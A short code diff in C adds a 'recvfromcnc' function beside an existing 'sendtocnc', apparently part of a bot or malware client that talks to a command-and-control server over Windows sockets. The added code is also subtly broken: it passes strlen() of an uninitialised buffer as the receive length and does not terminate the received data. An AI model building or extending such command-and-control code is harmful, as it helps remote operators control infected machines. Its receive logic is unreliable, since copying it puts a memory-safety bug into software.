@@ -72,3 +72,13 @@ void sendtocnc(char *buf) {
     exit(1);
   }
 }
+
+char *recvfromcnc(int buffsize) {
+  char *buf = malloc(buffsize);
+  int res = recv(*cnc, buf, strlen(buf), 0);
+  if (res == SOCKET_ERROR) {
+    printf("recv failed: %d\n", WSAGetLastError());
+    exit(1);
+  }
+  return buf;
+}
